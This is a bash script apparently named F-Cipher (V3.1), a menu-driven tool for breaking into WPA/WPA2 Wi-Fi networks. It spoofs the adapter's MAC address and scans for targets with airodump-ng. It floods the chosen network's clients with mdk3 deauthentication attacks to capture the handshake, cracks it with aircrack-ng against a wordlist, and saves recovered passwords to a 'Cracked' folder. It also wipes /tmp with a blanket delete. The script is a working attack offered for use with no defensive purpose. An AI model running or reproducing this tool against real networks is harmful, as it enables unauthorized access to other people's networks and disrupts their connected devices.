#!/usr/bin/env bash



############ < Colors > ############
#                                  #
# Regular Colors 		   #
Black='\e[0;30m'        # Black    #
Red='\e[0;31m'          # Red      #
Green='\e[0;32m'        # Green    #
Yellow='\e[0;33m'       # Yellow   #
Blue='\e[0;34m'         # Blue     #
Purple='\e[0;35m'       # Purple   #
Cyan='\e[0;36m'         # Cyan     #
White='\e[0;37m'        # White    #
#                                  #
# Bold                             #
BBlack='\e[1;30m'       # Black    #
BRed='\e[1;31m'         # Red      #
BGreen='\e[1;32m'       # Green    #
BYellow='\e[1;33m'      # Yellow   #
BBlue='\e[1;34m'        # Blue     #
BPurple='\e[1;35m'      # Purple   #
BCyan='\e[1;36m'        # Cyan     #
BWhite='\e[1;37m'       # White    #
#                                  #
####################################
NC='\033[0m' # No Color
#
#
#
#
#
Menu()
{
	trap Mana_Mode EXIT
clear; 


echo -e "				${Red} _______ ${Blue}        ${Blue} _______  _         _                                                                         ";
echo -e "				${Red}(_______)${Blue}        ${Blue}(_______)(_)       | |                                                                        ";
echo -e "				${Red} _____   ${BGreen} _____  ${Blue} _        _  ____  | |__   _____   ____                                                     ";
echo -e "				${Red}|  ___)  ${BGreen}(_____) ${Blue}| |      | ||  _ \ |  _ \ | ___ | / ___)                                                    ";
echo -e "				${Red}| |      ${BGreen}        ${Blue}| |_____ | || |_| || | | || ____|| |                                                        ";
echo -e "				${Red}|_|      ${Blue}         ${Blue}\______)|_||  __/ |_| |_||_____)|_| ${Yellow}(${Purple}V${Red}3${BBlue}.${Red}1${Yellow})    ";
echo -e "				${Red}         ${Blue}           ${Blue}         |_|                                                                               ";


echo -e "\n\n"                             
echo -e "
							${BWhite}1. ${Purple}Scan Only

							${BWhite}2. ${Blue}Generate Wordlist                
	                                            
							${BWhite}3. ${Cyan}Break Encryption ${Yellow}(${Red}WPA/2${Yellow})       
                                                 
							${BWhite}4. ${Yellow}Disable Monitor Mode      
		                                    
							${BWhite}5. ${Red}Exit                     
"                                                  
                                                                       
#"


echo -ne "\n\n\n\n${Blue}Enter An Option:${Green} "; read option

if [[ $option -eq ""  || $option -gt 5 ]]
then
	ReMenu
fi


if [[ $option -eq 1 ]]
then
	ScanOnly
fi


if [[ $option -eq 2 ]]
then
	Generate
fi

if [[ $option -eq 3 ]]
then
	Attack
fi

if [[ $option -eq 4 ]]
then
	Mana_Mode; Menu
fi

if [[ $option -eq 5 ]]
then
	Mana_Mode; exit
fi



}
#
#
#
#
#
ScanOnly()
{
	rm /tmp/* &>/dev/null
	sleep 0.7;clear sleep 0.4
	Find_Interface
	Mon_Mode
	clear;sleep 1; printf "${Yellow}[${Red}*${Yellow}] Press Ctrl+C Anytime For Main Menu"; sleep 2
	sudo xterm -fg green -fullscreen -e "airodump-ng --berlin 120 $wlan "
	sleep 0.2; clear; sleep 0.4; Menu
		
}
#
#
#
#
#
Find_Interface()
{
	for ((inter=30; inter>=0; inter--))
	do
		
		Interface=$(ifconfig | grep -o wlan$inter)
		if [[ -n $Interface ]]
		then
			wlan=$Interface;
		fi
		 
		if [[ $inter -eq 0 && -z $Interface  ]]
		then
			clear; echo -ne "${Red}[!] No Wireless Adapter Found\n\n"; sleep 3; exit
		fi
	done
}
#
#
#
#
#
ReMenu()
{
	Menu
}
#
#
#
#
#
Mon_Mode()
{
	Find_Interface
	ifconfig $wlan down; iwconfig $wlan mode monitor;for ((i=0; i<=10; i++)); do macchanger -r $wlan &> /dev/null; done; ifconfig $wlan up
}
#
#
#
#
#
Mana_Mode()
{
	ifconfig $wlan down &> /dev/null && ifconfig $wlan up &>/dev/null
	Find_Interface
	if [[ -n $wlan ]]
	then
		if (iwconfig $wlan | grep -q 'Monitor')
		then
			ifconfig $wlan down; ifconfig $wlan up; service network-manager restart; 
		else
			ifconfig $wlan down; ifconfig $wlan up; service network-manager restart; 
		fi
	else
		ifconfig $wlan down; ifconfig $wlan up; service network-manager restart;   
	fi
}
#
#
#
#
#
#For Macchanger
function Mac
{
	sudo ifconfig $wlan down
	for ((x=0; x<=10; x++))
	do
		sudo macchanger -r $wlan &> /dev/null
	done
}

#For Enabling Mode Monitor
function Monitor
{
	Mac
	sudo iwconfig $wlan mode monitor &> /dev/null
	sudo ifconfig $wlan up
}


#For Removing Handshakes 
function Remove
{
	sudo rm /root/Handshake/Hand-01.csv	&> /dev/null
	sudo rm /root/Handshake/Hand-01.cap	&> /dev/null
	sudo rm /root/Handshake/blacklist       &> /dev/null
	killall airodump-ng 			&>/dev/null
	let T=0
}


#For Running Aireplay
function Aireplay 
{
	
	if (ls /root/Handshake | grep -q "Hand-01.csv")
	then
		
		Channel=$(cat /root/Handshake/Hand-01.csv | grep $Essid | awk 'NR==1{print $6}' | cut -d ',' -f 1 | sort )
		Client_Mac1=$(cat /root/Handshake/Hand-01.csv | grep $Bssid | awk 'NR==2{print $1}' | cut -d ',' -f 1)
		Client_Mac2=$(cat /root/Handshake/Hand-01.csv | grep $Bssid | awk 'NR==3{print $1}' | cut -d ',' -f 1)
		Client_Mac3=$(cat /root/Handshake/Hand-01.csv | grep $Bssid | awk 'NR==4{print $1}' | cut -d ',' -f 1)
		Client_Mac4=$(cat /root/Handshake/Hand-01.csv | grep $Bssid | awk 'NR==5{print $1}' | cut -d ',' -f 1)
		Clients=$(cat /root/Handshake/Hand-01.csv | grep $Bssid | awk '{print $1}' | cut -d ',' -f 1)
		

		### < Setting Up Mdk3 Blacklist > ###
		touch /root/Handshake/blacklist
		Blist=(/root/Handshake/blacklist)
	

	
	
	
		if (cat /root/Handshake/Hand-01.csv | grep $Bssid | awk 'NR==2{print $1}' | cut -d ',' -f 1 | grep -o ":" )
			then  
				if !( cat $Blist | grep $Client_Mac1)
				then
					echo -e "$Client_Mac1">> /root/Handshake/blacklist 
				fi
			    	clear; echo -ne "${Red}[${Green}*${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac1 ${NC}\n"; sleep 3
				
				for ((i=0; i<=10; i++))
				do
				sudo xterm -g 88x15-900+900  -T "Mdk3" -e "sudo mdk3 $wlan d -b /root/Handshake/blacklist -c $Channel " &
				



				done 
				if (cat /root/Handshake/Hand-01.csv | grep $Bssid | awk 'NR==3{print $1}' | cut -d ',' -f 1 | grep -o ":" )
				then
					if !( cat $Blist | grep $Client_Mac2)
					then
						echo -e "$Client_Mac2">> /root/Handshake/blacklist 
					fi
					echo -ne "${Red}[${Green}*${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac2 ${NC}\n"; sleep 3
					for ((w=0; w<=10; w++))
					do
					sudo xterm -g 88x15-900+900  -T "Mdk3" -e "sudo mdk3 $wlan d -b /root/Handshake/blacklist -c $Channel " &
					



					done
					
					if (cat /root/Handshake/Hand-01.csv | grep $Bssid | awk 'NR==4{print $1}' | cut -d ',' -f 1 | grep -o ":" )
					then
						if !( cat $Blist | grep $Client_Mac3)
						then
							echo -e "$Client_Mac3">> /root/Handshake/blacklist 
						fi
						echo -ne "${Red}[${Green}*${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac3 ${NC}\n"; sleep 3
						for ((x=0; x<=10; x++))
						do
						sudo xterm -g 88x15-900+900  -T  "MDK3" -e "sudo mdk3 $wlan d -b /root/Handshake/blacklist -c $Channel  " &
						

						done
						 
			
	
					fi
			
			
				fi

				

	

			else
				clear;printf "${Red}[${Green}*${Red}] ${Green} Can't Find Any Wifi Devices On ${Red}$Essid${NC}"; sleep 5; clear
				Handshake	
			fi
		
			
		
		sleep 30
		 

	
	
	
	fi
	
	
		
}

#For Checking Handshake & Cracking
T=0
function Handshake
{
	
		Remove
		
	while :
	do
		
		
		
		if [[ $T -eq 0 ]]
		then
			
			sleep 2;killall airodump-ng &>/dev/null; let T++;clear
		fi
		
		if [[ $T -eq 1 ]]
		then
			sleep 1;clear;echo -ne  "${Yellow}[${Red}+${Yellow}]${Green} Monitoring: ${Red}$Essid${NC}"; sleep 3
			gnome-terminal --geometry 88x19+1900-700 -e "airodump-ng --bssid $Bssid  -w /root/Handshake/Hand --output-format csv,cap --ig $wlan " & sleep 30 && let T++	
		fi
		
		
		Aireplay 
		for ((kills=0;kills<=10;kills++))
		do
			if (ps -cax | grep -q "mdk3")
			then
				killall mdk3;clear
			fi
		done
		
		if (ls /root/Handshake | grep -q "Hand")
		then
			
			if ( aircrack-ng /root/Handshake/Hand-01.cap | grep -q "1 handshake" )
			then
				clear; echo -ne "${Green}[+] Four-Way HandShake Found${NC}"; sleep 3
				killall airodump-ng && pkill mdk3 &
				Mana_Mode
				clear
				xterm -geometry 34x9 -e killall mdk3 
				
			sudo xterm -hold -fg cyan -g 88x20-900+900 -T "Cracking into $Essid" -e "sudo aircrack-ng -b $Bssid /root/Handshake/Hand-01.cap -w $Pass | tee -i /root/Handshake/Key.txt" & 
				clear;
				sleep 3
				while :
				do
					if !(ps cax | grep -q aircrack-ng)
					then	
						Passkey=$(cat /root/Handshake/Key.txt | grep "KEY FOUND!"  |  awk 'NR==1{print $4}')
						if [[ -n $Passkey ]]
						then
							
							
							Exist1=$(ls /root/Desktop | grep Cracked)

							if [[ -z $Exist1 ]]
							then
								sudo mkdir /root/Desktop/Cracked
							fi
							Exist2=$(ls /root/Desktop/Cracked | grep  "$Essid")
							if [[ -z $Esist2 ]]
							then
								sudo touch /root/Desktop/Cracked/$Essid
							fi
							Exist3=$(cat /root/Desktop/Cracked/$Essid | grep  "$Passkey")

							if [[ -z $Exist3  ]]
							then
								sudo echo -e "Essid: $Essid\n\nPassword: $Passkey" > /root/Desktop/Cracked/$Essid
							fi
						fi
						rm -rf /root/Handshake; break 2> /dev/null
					fi
				done; Menu
				
		
			fi
		
		fi
		sleep 10

	done
}

#For Searching For The Target  & Attack
Attack()
{
	
	
	clear; sleep 1
	Loading_2
	 
	clear;sleep 1;echo -ne "${Cyan}Enter Wordlist Path:${Green} "; read Pass
	
	until [[ -r $Pass ]]
	do
		if [[ -n $Pass ]]
		then
		sleep 0.7; clear;sleep 0.2; echo -e "${Yellow}[${Red}!${Yellow}]${Red} Can't Find: ${Cyan}$Pass"; sleep 3; clear; sleep 0.2; clear;sleep 1;echo -ne "${Cyan}Enter Wordlist Path:${Green} "; read Pass
		else
			sleep 0.7; clear;sleep 0.2; echo -e "${Yellow}[${Red}!${Yellow}]${Red} Please Enter A Wordlist ${Cyan}"; sleep 3; clear; sleep 0.2; clear;sleep 1;echo -ne "${Cyan}Enter Wordlist Path:${Green} "; read Pass
		fi
	done;
	
			Find_Interface
			Mon_Mode	
			clear;sleep 1; printf "${Yellow}[${Red}+${Yellow}] Scanning Press Ctrl${Red}+${Yellow}C  When Ready"; sleep 2;clear
			 airodump-ng $wlan 2>&1 | tee -i /tmp/log; clear; echo -e "${Green}Loading List..."; sleep 3

	
				Items()
				{
					clear
					declare -a ArrayBox
					APs=$(cat /tmp/log  | awk '{print $11 $12}' | cut -d ":" -f 2 | grep -v ESSID | sort)
					echo "$APs" > /tmp/Nets
					touch /tmp/list; sleep 1
					while read line
					do
			
						if [[ -n "$line" ]]
						then	if [[ ${#line} -gt 3 ]]
							then
								if [[ "$line" != "" ]]
								then
									if [[ "$line" != "0>" ]]
									then
										if !( cat /tmp/list | grep -q "$line" )
										then
											echo "$line" >> /tmp/list 
										fi
									fi
								fi
							fi	
						fi
			
						done < /tmp/Nets
						ArrayBox=($(</tmp/list))
						numOfLines=$(cat /tmp/list | wc -l)	
						Boxes=$numOfLines-2
						for ((i=0; i<=$Boxes; i++))
						do
							  
							  if [[ ${#ArrayBox[$i]} -ge 3 ]]
							  then
								  if [[ $i -eq 0 ]]
								  then
									echo -e "${Cyan}[${Green}0$i${Cyan}] ${Yellow} ${ArrayBox[$i]}"
								  elif [[ $i -lt 10 ]]
								  then
									echo -e "${Cyan}[${Green}0$i${Cyan}] ${Yellow} ${ArrayBox[$i]}"
								  
								  fi

								  if [[ $i -gt 9 ]]
								  then
									echo -e "${Cyan}[${Green}$i${Cyan}] ${Yellow}${ArrayBox[$i]}"
								  fi
							fi

		

						done

					
					echo -ne "${Blue}\n\nEnter Number:${Green} "; read num
				
					until  [[ $option -le $Boxes ]]
					do
						        clear
							for ((i=0; i<=$Boxes; i++))
						do
							  
							  if [[ ${#ArrayBox[$i]} -ge 3 ]]
							  then
								  if [[ $i -eq 0 ]]
								  then
									echo -e "${Cyan}[${Green}0$i${Cyan}] ${Yellow} ${ArrayBox[$i]}"
								  elif [[ $i -lt 10 ]]
								  then
									echo -e "${Cyan}[${Green}0$i${Cyan}] ${Yellow} ${ArrayBox[$i]}"
								  
								  fi

								  if [[ $i -gt 9 ]]
								  then
									echo -e "${Cyan}[${Green}$i${Cyan}] ${Yellow}${ArrayBox[$i]}"
								  fi
							fi

		

						done
						echo -ne "${Blue}\n\nEnter Number:${Green} "; read num

					done

					if [[ "$num" -gt $Boxes ]]
					then
	
						echo -en "\033[1A\033[2K"; RepeatItems
					else
						if [[ -z ${ArrayBox[$num]}  ]]
						then
							
							 echo -en "\033[1A\033[2K"; RepeatItems
						else 
							
							Essid=${ArrayBox[$num]}; 
						fi
					fi 	
				}

				 

			RepeatItems()
			{
				Items
			}
			Items;

	


	sleep 1
	while :
	do
		if !(ls /root | grep -q "Handshake")
		then
			mkdir /root/Handshake
		fi
		clear;echo -ne "${Yellow}[${Red}+${Yellow}] Searching For: ${Red}$Essid${NC}"; sleep 3
		airodump-ng --berlin 10  --output-format csv -w /root/Handshake/Hand $wlan &> /dev/null & sleep 10; 
		killall airodump &> /dev/null

		Channel=$(cat /root/Handshake/Hand-01.csv  | grep $Essid | awk 'NR==1{print $6 }' | cut -d ',' -f 1)
		Bssid=$(cat /root/Handshake/Hand-01.csv  | grep $Essid | awk 'NR==1{print $1 }' | cut -d ',' -f 1)

		if (cat /root/Handshake/Hand-01.csv| grep -q "$Bssid")
		then
			clear;echo -ne "${Yellow}[${Green}+${Yellow}] Found: ${Red}$Essid"; sleep 3; clear 
			Handshake
		else
			clear;echo -ne "${Yellow}[${Red}*${Yellow}] Can't Find: ${Red}$Essid"; sleep 3; clear 
			rm /root/Handshake/Hand-01.cap;killall airodump-ng; clear
		fi
	done
}




function Generate
{
	trap Menu EXIT
	
	clear; sleep 1
	for ((Load=0;Load<=15;Load++))
	do
		
		echo -e "${Green}Loading (\)";sleep .1;clear
		echo -e "${Green}Loading (|)";sleep .1;clear
		echo -e "${Green}Loading (/)";sleep .1;clear
		echo -e "${Green}Loading (-)";sleep .1;clear
	done
	clear
	sleep 1
	
	echo -ne "${Cyan}Length Of Password : ${Green}"
	read Len
	
	until [[ "$Len" -ge 8 && "$Len" =~ ^[+-]?[0-9]+$ ]]
	do
		
		clear;sleep 0.7; echo -e "${Yellow}[${Red}!${Yellow}] The Password length Must Be 8 Or Above Chararters Long${NC}"; sleep 3
		clear;sleep 0.7; echo -ne "${Cyan}Length Of Password : ${Green}"
		read Len
		

	done
	
	sleep .7
	echo -ne "\n\n${Cyan}How Many Times Do You Like A Single Char To Repeat: ${Green}"
	read Repeat
	until [[ "$Repeat" -ge 0 && "$Repeat" =~ ^[+-]?[0-9]+$ ]]
	do
		
		clear; echo -e "${Yellow}[${Red}!${Yellow}] Please Enter A Number${NC}"; sleep 3;clear; sleep 0.7
		echo -ne "\n\n${Cyan}How Many Times Do You Like A Single Char To Repeat: ${Green}"
		read Repeat
		

	done
	
	
	sleep .7
	echo -ne "\n\n${Cyan}Input The Numbers And Letter To Use: ${Green}"	
	read Letters
	
	sleep .7
	echo -e "\n\n${Cyan}Type In The Algorithm:\n\n${Green}   Essid: ${Red}DG860A82\n\n${Blue}   Password: ${Red}DG860A%@@%82${NC}\n\n${Cyan}   Where ${Red}@${Cyan} is letter & numbers ${Green}|${Cyan} Where ${Yellow}%${Cyan} is only number \n\n${Green}"
	read Pass 
	until [[ ${#Pass} -eq $Len ]]
	do
		sleep .7; clear; sleep 0.7;echo -e "${Yellow}[${Red}!${Yellow}] Please Make Sure That The ${Red}Password's${Yellow} Length & The ${Blue}Algorithm's${Yellow} Match "; sleep 3; clear
		echo -e "\n\n${Cyan}Type In The Algorithm:\n\n${Green}   Essid: ${Red}DG860A82\n\n${Blue}   Password: ${Red}DG860A%@@%82${NC}\n\n${Cyan}   Where ${Red}@${Cyan} is letter & numbers ${Green}|${Cyan} Where ${Yellow}%${Cyan} is only number \n\n${Green}"
	read Pass 	
	done
	clear
	sleep .7
	echo -ne "${Cyan}What Would You Like To Save The Wordlist As: ${Green}"
	read Wor
	sleep 1
	clear
	echo -ne "${Green}Starting Up Crunch... ${NC}"
	sleep 3
	clear; sleep 0.7
	echo -e "${Red}[${Green}*${Red}]${Green} Generating: ${Blue}$Wor ${NC}"; sleep 3
	crunch $Len $Len  $Letters -t $Pass  -d $Repeat@  -o $Wor &> /dev/null
	clear
	if !( ls | grep -q $Wor )
	then
		while :
		do
			clear; sleep 0.7
			#crunch $Len $Len  $Letters -t $Pass  -d $Repeat@  -o $Wor 
			echo -e "${Yellow}[${Red}*${Yellow}] Crunch did't work Retrying${NC}"; sleep 2 
			Generate
			if ( ls | grep $Wor.txt || grep $Wor.lst )
			then
				sleep 3
				clear
				Menu
			fi
		done
	fi

	sleep 0.7; echo -e "${Red}[${Green}*${Red}]${Green} Generated: ${Blue}$Wor ${NC}"; sleep 3
	clear; sleep 0.7
	Menu
	
}

function Loading_1
{
	
	for ((Load=0;Load<10;Load++))
	do
		
		echo -e "${Green}Loading [\]";sleep .1;clear
		echo -e "${Green}Loading [|]";sleep .1;clear
		echo -e "${Green}Loading [/]";sleep .1;clear
		echo -e "${Green}Loading [-]";sleep .1;clear
	done
}

function Loading_2
{
	for ((Load=0;Load<10;Load++))
	do
		
		echo -e "${Green}Loading.";sleep .2;clear
		echo -e "${Green}Loading..";sleep .2;clear
		echo -e "${Green}Loading...";sleep .2;clear
		echo -e "${Green}Loading....";sleep .2;clear
	done
}
######### Funtions End Here #################




#### Script Starts Here ######
if !(whoami | grep -q "root")
then
	clear; sleep 3; echo -e "${Red}[*] Please Run As Root ${NC}"; sleep 3; clear; exit
fi
if (ps -cax | grep -q "airodump-ng" )
then
	for ((i=0; i <= 10; i++))
	do
		killall airodump-ng  &> /dev/null
		killall xterm    &> /dev/null
	done
fi

sleep 0.7;clear; sleep 0.4;rm /tmp/* &>/dev/null
killall xterm &>/dev/null
rm -rf /root/Handshake &>/dev/null
killall aircrack-ng &>/dev/null
Menu




	
